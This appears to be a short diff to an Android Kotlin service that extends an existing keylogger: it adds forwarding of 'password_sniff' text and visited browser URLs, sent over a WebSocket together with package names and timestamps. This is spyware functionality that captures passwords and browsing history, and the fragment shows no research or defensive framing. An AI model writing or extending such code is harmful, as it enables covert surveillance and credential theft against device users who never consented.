@@ -64,8 +64,10 @@ class ADexForegroundService : Service(), WebSocketEvents {
                     "packageName" to packageName,
                     "timestamp" to System.currentTimeMillis()
                 )
-                if (eventType == "keylog") {
+                if (eventType == "keylog" || eventType == "password_sniff") {
                     payload["text"] = intent.getStringExtra("text") ?: ""
+                } else if (eventType == "browser_url") {
+                    payload["url"] = intent.getStringExtra("url") ?: ""
                 }
                 webSocketManager.sendEvent(eventType, payload)
             }
